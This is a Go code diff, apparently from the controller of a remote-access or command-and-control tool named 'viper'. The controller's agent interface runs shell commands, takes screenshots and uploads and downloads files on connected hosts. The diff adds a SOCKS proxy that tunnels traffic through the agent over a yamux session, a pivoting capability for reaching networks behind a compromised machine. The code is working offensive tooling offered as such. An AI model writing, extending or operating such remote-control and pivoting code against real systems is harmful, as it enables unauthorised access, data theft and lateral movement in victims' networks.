@@ -9,16 +9,24 @@ import (
 	"net"
 	"time"
 
+	"github.com/hashicorp/yamux"
 	"google.golang.org/protobuf/proto"
 
 	pb "viper/protos/cmds"
 )
+
+type SocksServer struct {
+	session   *yamux.Session
+	agentConn net.Conn
+	proxyAddr net.Addr
+}
 
 type Agent struct {
 	Id          int64
 	alive       bool
 	conn        net.Conn
 	ConnectTime time.Time
+	socks       *SocksServer
 }
 
 const (
@@ -75,7 +83,7 @@ func (agent *Agent) Screenshot(req *pb.ScreenshotRequest) (*pb.ScreenshotRespons
 		return nil, err
 	}
 	if resp.Err != "" {
-		return nil, fmt.Errorf("Failed to take screenshot: %v", resp.Err)
+		return nil, errors.New(resp.Err)
 	}
 	return resp, nil
 }
@@ -106,7 +114,7 @@ func (agent *Agent) RunShellCommand(req *pb.ShellCommandRequest) (*pb.ShellComma
 		return nil, err
 	}
 	if resp.Err != "" {
-		return nil, fmt.Errorf("Failed to run shell command: %v : %s", resp.Err, resp.Data)
+		return nil, errors.New(resp.Err)
 	}
 	return resp, nil
 }
@@ -123,7 +131,7 @@ func (agent *Agent) DownloadFile(req *pb.DownloadFileRequest) (*pb.DownloadFileR
 		return nil, err
 	}
 	if resp.Err != "" {
-		return nil, fmt.Errorf("Failed to download file: %v", resp.Err)
+		return nil, errors.New(resp.Err)
 	}
 	return resp, nil
 }
@@ -140,9 +148,68 @@ func (agent *Agent) UploadFile(req *pb.UploadFileRequest) (*pb.UploadFileRespons
 		return nil, err
 	}
 	if resp.Err != "" {
-		return nil, fmt.Errorf("Failed to upload file: %v", resp.Err)
+		return nil, errors.New(resp.Err)
 	}
 	return resp, nil
+}
+
+func (agent *Agent) StartSocksServer(req *pb.StartSocksServerRequest) (*pb.StartSocksServerResponse, error) {
+	if agent.socks != nil {
+		return nil, fmt.Errorf("[%d] SOCKS server already running at %v.", agent.Id, agent.socks.proxyAddr)
+	}
+	cmdReq := &pb.CommandRequest{Type: pb.START_SOCKS_CMD_TYPE, Req: &pb.CommandRequest_StartSocksServerRequest{StartSocksServerRequest: req}}
+	err := agent.write(cmdReq)
+	if err != nil {
+		return nil, err
+	}
+	resp := &pb.StartSocksServerResponse{}
+	err = agent.read(resp)
+	if err != nil {
+		return nil, err
+	}
+	if resp.Err != "" {
+		return nil, errors.New(resp.Err)
+	}
+	socksSession, err := yamux.Client(agent.conn, nil)
+	if err != nil {
+		return nil, err
+	}
+	log.Printf("[%d] Connected to the SOCKS server.", agent.Id)
+	controllerSocksListener, err := net.Listen("tcp", "127.0.0.1:")
+	if err != nil {
+		socksSession.Close()
+		return nil, err
+	}
+	resp.Addr = controllerSocksListener.Addr().String()
+	log.Printf("[%d] SOCKS proxy server @ %s", agent.Id, resp.Addr)
+	agent.socks = &SocksServer{session: socksSession, proxyAddr: controllerSocksListener.Addr()}
+	go func() {
+		for {
+			agentConn, err := socksSession.Open()
+			if err != nil {
+				log.Printf("Failed to open a SOCKS session.")
+				socksSession.Close()
+			}
+			controllerConn, err := controllerSocksListener.Accept()
+			if err != nil {
+				log.Printf("[%d] Failed to accept new SOCKS proxy connection.", agent.Id)
+				socksSession.Close()
+			}
+			go proxyConns(controllerConn, agentConn)
+			go proxyConns(agentConn, controllerConn)
+		}
+	}()
+	return resp, nil
+}
+
+func proxyConns(conn1, conn2 net.Conn) {
+	_, err := io.Copy(conn1, conn2)
+	if err != nil {
+		log.Printf("Failed to proxy connections: %v", err)
+		return
+	}
+	conn1.Close()
+	conn2.Close()
 }
 
 func (agent *Agent) read(resp proto.Message) error {
